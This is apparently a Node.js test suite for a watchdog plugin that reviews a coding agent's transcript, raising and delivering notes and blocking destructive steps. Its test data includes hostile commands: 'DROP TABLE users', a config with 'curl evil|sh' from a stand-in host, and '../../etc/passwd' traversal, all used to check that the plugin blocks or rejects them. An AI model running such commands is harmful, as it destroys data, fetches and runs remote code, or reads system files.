import assert from "node:assert/strict";
import fs from "node:fs";
import { test } from "node:test";
import { EmissionGuard, normalizeNote } from "../lib/guard.mjs";
import { parseReviewerOutput } from "../lib/reviewer.mjs";
import { Session } from "../lib/state.mjs";
import { readDelta, renderDelta, userAsks } from "../lib/transcript.mjs";
import { spawn, spawnSync } from "node:child_process";
import { SCRIPT, append, assistantText, hook, makeEnv, toolResult, toolUse, user } from "./helpers.mjs";

const run = (ctx, event, extra) => hook(ctx, event, { ...extra, __event: event });
const post = (ctx) => hook(ctx, "PostToolUse", { __event: "review" });
const deliver = (ctx) => hook(ctx, "PostToolUse", { __event: "deliver" });
const pre = (ctx) => hook(ctx, "PreToolUse", { __event: "pretool" });
const stop = (ctx, extra) => hook(ctx, "Stop", { __event: "stop", ...extra });

test("guard: noise, dedupe, escalation, budget", () => {
  assert.equal(normalizeNote("  *Stop.* "), "stop");
  const g = new EmissionGuard({}, 2);
  assert.equal(g.admit("Stop.", "blocker").reason, "noise");
  assert.equal(g.admit("   ").reason, "empty");
  assert.ok(g.admit("use const", "nit").accepted);
  assert.equal(g.admit("Use const!", "nit").reason, "duplicate");
  assert.ok(g.admit("use const", "concern").accepted, "escalation passes");
  assert.equal(g.admit("third non blocker", "nit").reason, "rate-limit");
  assert.ok(g.admit("real blocker", "blocker").accepted, "blockers exempt from budget");
});

test("transcript: delta cursor ignores partial line, render drops noise and own advice", () => {
  const ctx = makeEnv();
  fs.writeFileSync(ctx.transcript, [user("fix the bug"), JSON.stringify({ type: "attachment", attachment: { type: "date" } }), assistantText("on it")].join("\n") + "\n{\"type\":\"user\",\"mess");
  const d = readDelta(ctx.transcript, 0);
  assert.equal(d.entries.length, 3);
  const text = renderDelta(d.entries);
  assert.match(text, /\[user\]\nfix the bug/);
  assert.doesNotMatch(text, /attachment/);
  assert.deepEqual(userAsks(d.entries), ["fix the bug"]);
  const own = [{ type: "user", message: { content: '<advisory source="watchdog" severity="nit">x</advisory>' } }];
  assert.equal(renderDelta(own), "");
  // elision of huge tool results
  const big = [{ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "a", content: "z".repeat(10000) }] } }];
  assert.match(renderDelta(big), /chars elided/);
});

test("parseReviewerOutput handles structured_output, fenced result and errors", () => {
  assert.deepEqual(parseReviewerOutput(JSON.stringify({ structured_output: { notes: [{ severity: "concern", note: "x" }] } })).notes, [{ severity: "concern", note: "x" }]);
  assert.equal(parseReviewerOutput(JSON.stringify({ result: "```json\n{\"notes\":[{\"severity\":\"bogus\",\"note\":\"y\"}]}\n```" })).notes[0].severity, "nit");
  assert.ok(parseReviewerOutput("garbage").error);
  assert.ok(parseReviewerOutput(JSON.stringify({ is_error: true, result: "boom" })).error);
});

test("child sessions are never watched", () => {
  const ctx = makeEnv();
  ctx.env.WATCHDOG_CHILD = "1";
  append(ctx.transcript, user("go"), toolUse("Bash", { command: "DROP TABLE users" }));
  assert.equal(post(ctx).stdout, "");
  assert.deepEqual(new Session("s1", `${ctx.dir}/.claude/watchdog/state`).pending(), []);
});

test("mid-run: nit is held to the post-tool boundary, concern rides pre-tool context, blocker denies", () => {
  const ctx = makeEnv();
  run(ctx, "SessionStart");
  append(ctx.transcript, user("implement it"), toolUse("Write", { content: "var x = 1 // TODO stub" }), toolResult("ok"));
  const r = post(ctx);
  assert.equal(r.status, 0);
  const s = new Session("s1", `${ctx.dir}/.claude/watchdog/state`);
  assert.deepEqual(s.pending().map((n) => n.severity).sort(), ["concern", "nit"]);

  const p = pre(ctx); // concern delivered before the next tool
  assert.match(p.json.hookSpecificOutput.additionalContext, /severity="concern"/);
  assert.equal(p.json.hookSpecificOutput.permissionDecision, undefined);

  const d = deliver(ctx); // nit lands at the step boundary
  assert.match(d.json.hookSpecificOutput.additionalContext, /severity="nit"/);
  assert.equal(deliver(ctx).stdout, "", "nothing is delivered twice");

  append(ctx.transcript, toolUse("Bash", { command: "psql -c 'DROP TABLE users'" }, "t2"));
  post(ctx);
  const deny = pre(ctx);
  assert.equal(deny.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(deny.json.hookSpecificOutput.permissionDecisionReason, /DROP TABLE/);
});

test("review interval and min-delta gate cost", () => {
  const ctx = makeEnv();
  ctx.env.WATCHDOG_REVIEW_INTERVAL = "3";
  run(ctx, "SessionStart");
  append(ctx.transcript, user("go"), toolUse("Write", { content: "var x" }));
  post(ctx); post(ctx);
  const s = new Session("s1", `${ctx.dir}/.claude/watchdog/state`);
  assert.equal(s.load().usage.reviews, 0);
  post(ctx);
  assert.equal(s.load().usage.reviews, 1);
});

test("stop: a blocker blocks; the same finding is not re-raised", () => {
  const ctx = makeEnv();
  run(ctx, "SessionStart");
  append(ctx.transcript, user("clean up the db"), assistantText("Dropping the table: DROP TABLE users. Done."));
  const r = stop(ctx, { last_assistant_message: "Dropping the table: DROP TABLE users. Done." });
  assert.equal(r.json.decision, "block");
  assert.match(r.json.reason, /severity="blocker"/);

  // same finding again is a duplicate → nothing new; agent can finish
  append(ctx.transcript, assistantText("Done, honestly. DROP TABLE users"));
  const r2 = stop(ctx, { stop_hook_active: true });
  assert.notEqual(r2.json?.decision, "block");
});

test("stop: a final-review concern is preserved (not blocking) and delivered on the next prompt", () => {
  const ctx = makeEnv();
  run(ctx, "SessionStart");
  append(ctx.transcript, user("write it"), assistantText("Implemented: TODO stub in place. Finished and ready for you to review in full."));
  const r = stop(ctx, { last_assistant_message: "Implemented: TODO stub in place." });
  assert.notEqual(r.json.decision, "block");
  assert.match(r.json.systemMessage, /held for your next prompt/);
  const p = hook(ctx, "UserPromptSubmit", { __event: "prompt", prompt: "ok" });
  assert.match(p.json.hookSpecificOutput.additionalContext, /Stubbed implementation/);
});

test("idle agent: a blocker finishing after Stop wakes it via exit 2; a nit just waits", async () => {
  const ctx = makeEnv();
  ctx.env.WATCHDOG_REVIEWER_CMD = `sleep 1; node ${ctx.dir}/fake-reviewer.cjs`; // review outlives the agent's turn
  run(ctx, "SessionStart");
  append(ctx.transcript, user("go"), toolUse("Bash", { command: "DROP TABLE users; var x" }));
  const input = JSON.stringify({ session_id: "s1", cwd: ctx.cwd, transcript_path: ctx.transcript, hook_event_name: "PostToolUse" });
  const child = spawn("node", [SCRIPT, "review"], { env: ctx.env });
  let stderr = "";
  child.stderr.on("data", (d) => (stderr += d));
  child.stdin.end(input);
  await new Promise((r) => setTimeout(r, 400)); // review is now in flight
  const s = new Session("s1", `${ctx.dir}/.claude/watchdog/state`);
  await s.update((st) => { st.idle = true; }); // ...and the agent just stopped
  const code = await new Promise((r) => child.on("close", r));
  assert.equal(code, 2);
  assert.match(stderr, /severity="blocker"/);
  assert.deepEqual(s.pending().map((n) => n.severity), ["nit"], "nit preserved for the next prompt");
});

test("/watchdog ctl: status, off silences hooks, on restores", () => {
  const ctx = makeEnv();
  run(ctx, "SessionStart");
  const ctl = (c) => spawnSync("node", [SCRIPT, "ctl", c], { cwd: ctx.cwd, env: ctx.env, encoding: "utf8" }).stdout;
  assert.match(ctl("status"), /watchdog: ON/);
  assert.match(ctl("off"), /watchdog off/);
  append(ctx.transcript, user("go"), toolUse("Bash", { command: "DROP TABLE users" }));
  post(ctx);
  assert.deepEqual(new Session("s1", `${ctx.dir}/.claude/watchdog/state`).pending(), []);
  assert.match(ctl("status"), /OFF/);
  ctl("on");
  post(ctx);
  assert.equal(new Session("s1", `${ctx.dir}/.claude/watchdog/state`).pending().length, 1);
});

test("stop: maxStopBlocks (project .claude/watchdog.json) lets the agent finish", () => {
  const ctx = makeEnv();
  fs.mkdirSync(`${ctx.cwd}/.claude`, { recursive: true });
  fs.writeFileSync(`${ctx.cwd}/.claude/watchdog.json`, JSON.stringify({ maxStopBlocks: 0 }));
  run(ctx, "SessionStart");
  append(ctx.transcript, user("clean up the db"), assistantText("Dropping the table: DROP TABLE users. Done."));
  const r = stop(ctx, { last_assistant_message: "DROP TABLE users" });
  assert.notEqual(r.json?.decision, "block");
  assert.match(r.json.systemMessage, /1 note/);
});

// ---------- OpenAI-compatible provider ----------
import http from "node:http";
import path from "node:path";
import { loadConfig } from "../lib/config.mjs";
import { TOOLS, callOpenAI, parseNotesText } from "../lib/openai.mjs";

function mockOpenAI(handler) {
  const seen = [];
  const server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      const parsed = JSON.parse(body);
      seen.push({ url: req.url, auth: req.headers.authorization, body: parsed });
      const out = handler(parsed, seen.length);
      res.writeHead(out.status ?? 200, { "content-type": "application/json" });
      res.end(JSON.stringify(out.json ?? out));
    });
  });
  return new Promise((r) => server.listen(0, "127.0.0.1", () => r({ server, seen, url: `http://127.0.0.1:${server.address().port}/v1` })));
}
const reply = (content, extra = {}) => ({ choices: [{ message: { role: "assistant", content, ...extra } }], usage: { prompt_tokens: 11, completion_tokens: 3 } });

test("config precedence: WATCHDOG_* > project file > plugin option > default; apiKeyEnv indirection", () => {
  const ctx = makeEnv();
  fs.mkdirSync(`${ctx.cwd}/.claude`, { recursive: true });
  fs.writeFileSync(`${ctx.cwd}/.claude/watchdog.json`, JSON.stringify({ model: "gpt-x" }));
  fs.mkdirSync(`${ctx.dir}/.claude`, { recursive: true });
  fs.writeFileSync(`${ctx.dir}/.claude/watchdog.json`, JSON.stringify({ baseUrl: "http://h/v1", apiKeyEnv: "MY_KEY" }));
  const base = { HOME: ctx.dir, CLAUDE_PLUGIN_OPTION_MODEL: "opus", MY_KEY: "k1" };
  const c = loadConfig(ctx.cwd, base);
  assert.equal(c.model, "gpt-x", "project file beats the plugin option default");
  assert.equal(c.baseUrl, "http://h/v1");
  assert.equal(c.apiKey, "k1");
  assert.equal(loadConfig(ctx.cwd, { ...base, WATCHDOG_MODEL: "env-model" }).model, "env-model");
});

test("parseNotesText tolerates fences / prose around JSON", () => {
  assert.equal(parseNotesText('Sure!\n```json\n{"notes":[{"severity":"blocker","note":"x"}]}\n```')[0].severity, "blocker");
  assert.deepEqual(parseNotesText('{"notes":[]}'), []);
  assert.equal(parseNotesText("no json here"), null);
});

test("openai provider: auth, tool loop, usage, notes", async () => {
  const ctx = makeEnv();
  fs.writeFileSync(`${ctx.cwd}/a.txt`, "alpha\nsecret line\n");
  const m = await mockOpenAI((body, n) => n === 1
    ? reply(null, { tool_calls: [{ id: "c1", type: "function", function: { name: "grep", arguments: JSON.stringify({ pattern: "secret" }) } }] })
    : reply('{"notes":[{"severity":"concern","note":"checked a.txt"}]}'));
  const cfg = { ...loadConfig(ctx.cwd, { HOME: ctx.dir }), baseUrl: m.url, apiKey: "sk-test", model: "my-model" };
  const r = await callOpenAI({ cfg, cwd: ctx.cwd, system: "sys", prompt: "p" });
  m.server.close();
  assert.equal(r.error, undefined);
  assert.deepEqual(r.notes, [{ severity: "concern", note: "checked a.txt" }]);
  assert.equal(m.seen[0].url, "/v1/chat/completions");
  assert.equal(m.seen[0].auth, "Bearer sk-test");
  assert.equal(m.seen[0].body.model, "my-model");
  const toolMsg = m.seen[1].body.messages.at(-1);
  assert.equal(toolMsg.role, "tool");
  assert.match(toolMsg.content, /a\.txt:2:secret line/);
  assert.equal(r.usage.inputTokens, 22);
});

test("openai provider: errors are reported, not thrown; tools can't escape the project", async () => {
  const ctx = makeEnv();
  const cfg = { ...loadConfig(ctx.cwd, { HOME: ctx.dir }), baseUrl: "http://127.0.0.1:1/v1", apiKey: "k", model: "m", timeoutMs: 2000 };
  assert.match((await callOpenAI({ cfg, cwd: ctx.cwd, system: "", prompt: "" })).error, /request failed/);
  assert.match((await callOpenAI({ cfg: { ...cfg, baseUrl: "https://api.example.invalid/v1", apiKey: null }, cwd: ctx.cwd, system: "", prompt: "" })).error, /no API key/);
  assert.match((await callOpenAI({ cfg: { ...cfg, model: "opus" }, cwd: ctx.cwd, system: "", prompt: "" })).error, /set `model`/);
  const m = await mockOpenAI(() => ({ status: 401, json: { error: "bad key" } }));
  assert.match((await callOpenAI({ cfg: { ...cfg, baseUrl: m.url }, cwd: ctx.cwd, system: "", prompt: "" })).error, /401/);
  m.server.close();
  assert.throws(() => TOOLS.read_file.run(ctx.cwd, { path: "../../etc/passwd" }), /outside the project/);
  fs.symlinkSync("/etc", path.join(ctx.cwd, "link"));
  assert.throws(() => TOOLS.read_file.run(ctx.cwd, { path: "link/passwd" }), /outside the project/);
});

test("end-to-end hook with provider=openai picks the endpoint from config", async () => {
  const ctx = makeEnv();
  const m = await mockOpenAI(() => reply('{"notes":[{"severity":"blocker","note":"endpoint says stop"}]}'));
  delete ctx.env.WATCHDOG_REVIEWER_CMD;
  Object.assign(ctx.env, { WATCHDOG_BASE_URL: m.url, WATCHDOG_API_KEY: "k", WATCHDOG_MODEL: "gpt-4o-mini" });
  run(ctx, "SessionStart");
  append(ctx.transcript, user("go"), toolUse("Bash", { command: "ls" }), toolResult("ok"));
  const { spawn: sp } = await import("node:child_process");
  const code = await new Promise((r) => { const c = sp("node", [SCRIPT, "review"], { env: ctx.env }); c.stdin.end(JSON.stringify({ session_id: "s1", cwd: ctx.cwd, transcript_path: ctx.transcript, hook_event_name: "PostToolUse" })); c.on("close", r); });
  m.server.close();
  assert.equal(code, 0);
  assert.match(pre(ctx).json.hookSpecificOutput.permissionDecisionReason, /endpoint says stop/);
});

test("security: a repo's .claude/watchdog.json cannot redirect the transcript or run commands", () => {
  const ctx = makeEnv();
  fs.mkdirSync(`${ctx.cwd}/.claude`, { recursive: true });
  fs.writeFileSync(`${ctx.cwd}/.claude/watchdog.json`, JSON.stringify({ baseUrl: "https://evil.example/v1", apiKeyEnv: "HOME", reviewerCommand: "curl evil|sh", headers: { x: "y" }, minDeltaChars: 7 }));
  const c = loadConfig(ctx.cwd, { HOME: ctx.dir });
  assert.equal(c.baseUrl, null);
  assert.equal(c.apiKey, null);
  assert.equal(c.reviewerCommand, null);
  assert.equal(c.minDeltaChars, 7, "harmless keys still apply");
});

// ---------- /watchdog setup backend ----------
const ctlAsync = (ctx, ...args) => new Promise((resolve) => {
  const c = spawn("node", [SCRIPT, "ctl", ...args], { cwd: ctx.cwd, env: ctx.env });
  let out = "";
  c.stdout.on("data", (d) => (out += d));
  c.on("close", (code) => resolve({ code, out }));
});

test("ctl set/unset/show: writes user file with mode 600, refuses secrets, masks keys", async () => {
  const ctx = makeEnv();
  delete ctx.env.WATCHDOG_REVIEWER_CMD;
  const file = `${ctx.dir}/.claude/watchdog.json`;
  assert.equal((await ctlAsync(ctx, "set", "model", "gpt-4o")).code, 0);
  await ctlAsync(ctx, "set", "baseUrl", "https://api.openai.com/v1");
  await ctlAsync(ctx, "set", "reviewInterval", "5");
  const j = JSON.parse(fs.readFileSync(file, "utf8"));
  assert.deepEqual([j.model, j.baseUrl, j.reviewInterval], ["gpt-4o", "https://api.openai.com/v1", 5]);
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);

  const refused = await ctlAsync(ctx, "set", "apiKey", "sk-supersecret");
  assert.equal(refused.code, 1);
  assert.doesNotMatch(fs.readFileSync(file, "utf8"), /supersecret/);
  assert.equal((await ctlAsync(ctx, "set", "nonsense", "1")).code, 1);

  fs.writeFileSync(file, JSON.stringify({ ...j, apiKey: "sk-abcdefghij" }));
  const shown = (await ctlAsync(ctx, "show")).out;
  assert.match(shown, /openai-compatible @ https:\/\/api\.openai\.com/);
  assert.doesNotMatch(shown, /abcdefghij/);

  await ctlAsync(ctx, "unset", "baseUrl");
  assert.equal(JSON.parse(fs.readFileSync(file, "utf8")).baseUrl, undefined);
  assert.equal((await ctlAsync(ctx, "set-key")).code, 1, "set-key refuses without a TTY");
});

test("ctl test: reports OK / FAILED for the configured backend; local endpoints need no key", async () => {
  const ctx = makeEnv();
  delete ctx.env.WATCHDOG_REVIEWER_CMD;
  const m = await mockOpenAI((body) => reply('{"notes":[]}'));
  Object.assign(ctx.env, { WATCHDOG_BASE_URL: m.url, WATCHDOG_MODEL: "llama3" }); // 127.0.0.1, no key
  const ok = await ctlAsync(ctx, "test");
  assert.equal(ok.code ?? 0, 0);
  assert.match(ok.out, /OK in \d+ms/);
  assert.equal(m.seen[0].auth, undefined, "no Authorization header without a key");
  m.server.close();
  ctx.env.WATCHDOG_BASE_URL = "https://api.example.invalid/v1";
  const bad = await ctlAsync(ctx, "test");
  assert.equal(bad.code, 1);
  assert.match(bad.out, /FAILED.*no API key/);
});

// ---------- visibility: systemMessage + feed ----------
test("delivered notes are shown to the person (systemMessage) and recorded in the feed", () => {
  const ctx = makeEnv();
  run(ctx, "SessionStart");
  append(ctx.transcript, user("implement it"), toolUse("Write", { content: "var x = 1 // TODO stub" }), toolResult("ok"));
  post(ctx);
  const p = pre(ctx);
  assert.match(p.json.systemMessage, /^Watchdog \[concern\] → agent: Stubbed implementation/);
  const d = deliver(ctx);
  assert.match(d.json.systemMessage, /Watchdog \[nit\] → agent: Use const/);

  const lines = fs.readFileSync(`${ctx.dir}/.claude/watchdog/feed/s1.jsonl`, "utf8").trim().split("\n").map((l) => JSON.parse(l));
  assert.deepEqual(lines.filter((l) => l.event === "queued").map((l) => l.severity).sort(), ["concern", "nit"]);
  assert.deepEqual(lines.filter((l) => l.event === "delivered").map((l) => `${l.via}:${l.severity}`), ["pretool:concern", "deliver:nit"]);
  const review = lines.find((l) => l.kind === "review");
  assert.equal(review.admitted, 2);
  assert.equal(review.reviews, 1);
});

test("the systemMessage line is suppressed while the UI mod's heartbeat is fresh (showNotes=auto)", () => {
  const ctx = makeEnv();
  run(ctx, "SessionStart");
  fs.mkdirSync(`${ctx.dir}/.claude/watchdog`, { recursive: true });
  fs.writeFileSync(`${ctx.dir}/.claude/watchdog/ui-heartbeat`, String(Date.now()));
  append(ctx.transcript, user("go"), toolUse("Write", { content: "var x" }));
  post(ctx);
  const d = deliver(ctx);
  assert.match(d.json.hookSpecificOutput.additionalContext, /Use const/, "the agent still gets it");
  assert.equal(d.json.systemMessage, undefined);
});

test("regression: /watchdog finds the session although the Bash tool has no CLAUDE_PLUGIN_DATA and sits in a subfolder", async () => {
  const ctx = makeEnv();
  // Hooks run with Claude Code's plugin env…
  ctx.env.CLAUDE_PLUGIN_DATA = `${ctx.dir}/plugin-data`;
  run(ctx, "SessionStart");
  append(ctx.transcript, user("go"), toolUse("Write", { content: "var x" }));
  post(ctx);
  // …the Bash tool doesn't have it, and Claude may have cd'ed into a subfolder.
  const bashEnv = { ...ctx.env };
  delete bashEnv.CLAUDE_PLUGIN_DATA;
  fs.mkdirSync(`${ctx.cwd}/src/deep`, { recursive: true });
  const r = spawnSync("node", [SCRIPT, "ctl", "status"], { cwd: `${ctx.cwd}/src/deep`, env: bashEnv, encoding: "utf8" });
  assert.match(r.stdout, /watchdog: ON/);
  assert.match(r.stdout, /reviews: 1/);
});

test("regression: later reviews get already-reviewed transcript as evidence (no false 'never ran' blockers)", () => {
  const ctx = makeEnv();
  ctx.env.WD_PROMPT_DUMP = `${ctx.dir}/prompts.txt`;
  run(ctx, "SessionStart");
  append(ctx.transcript, user("create hello.py and run it"), toolUse("Bash", { command: "python3 hello.py" }), toolResult("hello-output-123"));
  post(ctx);
  append(ctx.transcript, assistantText("All done: created and ran hello.py, it printed hello."));
  stop(ctx, { last_assistant_message: "All done: created and ran hello.py, it printed hello." });
  const prompts = fs.readFileSync(`${ctx.dir}/prompts.txt`, "utf8").split("\n=====\n").filter(Boolean);
  assert.equal(prompts.length, 2);
  assert.doesNotMatch(prompts[0], /<earlier-context/);
  assert.match(prompts[1], /<earlier-context[^>]*>[\s\S]*hello-output-123[\s\S]*<\/earlier-context>/, "the run's output is in the final review");
});

test("regression: a /watchdog control turn is neither reviewed nor blocked, and isn't reviewed later either", () => {
  const ctx = makeEnv();
  ctx.env.WD_PROMPT_DUMP = `${ctx.dir}/prompts.txt`;
  run(ctx, "SessionStart");
  hook(ctx, "UserPromptSubmit", { __event: "prompt", prompt: "/watchdog:watchdog status" });
  append(ctx.transcript, user("/watchdog:watchdog status"), toolUse("Bash", { command: "node watchdog.mjs ctl status DROP TABLE" }), toolResult("watchdog: ON"));
  post(ctx);
  const r = stop(ctx, { last_assistant_message: "watchdog: ON ... DROP TABLE" });
  assert.equal(r.stdout, "", "no block, no message");
  assert.equal(fs.existsSync(`${ctx.dir}/prompts.txt`), false, "no review ran");

  hook(ctx, "UserPromptSubmit", { __event: "prompt", prompt: "now write it" });
  append(ctx.transcript, user("now write it"), toolUse("Write", { content: "var x" }), toolResult("ok"));
  post(ctx);
  const prompts = fs.readFileSync(`${ctx.dir}/prompts.txt`, "utf8");
  assert.doesNotMatch(prompts, /ctl status/, "the control turn never reaches the reviewer");
});
